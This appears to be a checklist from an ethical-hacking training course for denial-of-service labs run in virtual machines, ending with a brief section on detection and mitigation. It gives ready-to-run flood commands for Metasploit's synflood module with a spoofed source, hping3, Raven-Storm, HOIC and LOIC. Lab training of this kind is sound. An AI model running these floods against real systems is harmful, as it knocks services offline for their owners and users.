# Lab Tasks Checklist: Denial of Service

## Lab 1: Perform a DoS Attack Using Various Techniques

### **Lab Scenario**

Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks aim to overwhelm a target system or network, rendering it unavailable to legitimate users. These labs provide hands-on experience to understand and mitigate such attacks.

### **Lab Objectives**

- Perform SYN Flooding using Metasploit.
- Execute Ping of Death and UDP flood attacks using hping3.
- Simulate Layer 3/4/7 DoS attacks with Raven-Storm.
- Launch HTTP flood-based DDoS attacks using HOIC and LOIC.
- Detect and mitigate DoS and DDoS traffic.

### **Lab Environment**

- **Virtual Machines**: Windows 11, Windows Server 2022, Windows Server 2019, Parrot Security
- **Tools**: Metasploit, hping3, Raven-Storm, HOIC, LOIC, Wireshark, Anti-DDoS Guardian
- **Permissions**: Administrator access
- **Internet Connection**: Required

---

### **Checklist for SYN Flooding Using Metasploit**

- [ ]  Launch Windows 11, Windows Server 2019, and Parrot Security VMs.
- [ ]  Open the Parrot Security terminal and run `sudo su` to gain root access.
- [ ]  Scan the target (Windows 11) port status using `nmap -p 21 <Target_IP>`.
- [ ]  Launch Metasploit using `msfconsole` and load the module `auxiliary/dos/tcp/synflood`.
- [ ]  Set options:
    - RHOST: Target IP (Windows 11)
    - RPORT: 21
    - SHOST: Spoofed IP (Windows Server 2019)
- [ ]  Execute the exploit with `exploit` and observe packet flooding in Wireshark.
- [ ]  Terminate the attack after observation using `Ctrl+C`.

---

### **Checklist for Ping of Death and UDP Flood Attacks Using hping3**

- [ ]  Open the Parrot Security terminal and run `sudo su` to gain root access.
- [ ]  Execute a Ping of Death attack:
    - Command: `hping3 -d 65538 -S -p 21 --flood <Target_IP>`
- [ ]  Observe oversized packets crashing the Windows 11 target in Wireshark.
- [ ]  Perform a UDP flood attack:
    - Command: `hping3 -2 -p 139 --flood <Target_IP>`
- [ ]  Observe high UDP traffic on the Windows Server 2019 VM.

---

### **Checklist for Layer 3/4/7 DoS Attacks Using Raven-Storm**

- [ ]  Open the Parrot Security terminal and launch Raven-Storm with `sudo rst`.
- [ ]  Set the target IP and port using commands:
    - `ip <Target_IP>`
    - `port 80`
- [ ]  Set threads: `threads 20000`.
- [ ]  Initiate the attack with `run`.
- [ ]  Verify the attack in Wireshark and system performance on the target (Windows Server 2019).
- [ ]  Stop the attack using `Ctrl+Z`.

---

### **Checklist for HTTP Flood-Based DDoS Attacks Using HOIC and LOIC**

- [ ]  Copy the HOIC/LOIC folders to the Desktop of Windows 11, Server 2019, and Server 2022 VMs.
- [ ]  Configure HOIC:
    - Add target URL: `http://<Target_IP>`
    - Set Power to High and select `GenericBoost.hoic`.
    - Configure Threads: 20.
- [ ]  Initiate the attack on all machines by clicking "FIRE TEH LAZER!".
- [ ]  Observe traffic spikes on the Parrot Security VM using Wireshark.

---

### **Checklist for Detecting and Protecting Against DoS/DDoS Attacks**

- [ ]  Use Anti-DDoS Guardian on target systems to detect incoming attack traffic.
- [ ]  Configure rules to block SYN floods and UDP floods.
- [ ]  Analyze captured traffic in Wireshark to identify attack patterns.
- [ ]  Implement firewall rules and rate limiting on servers to mitigate attacks.

---
---

# Step-by-Step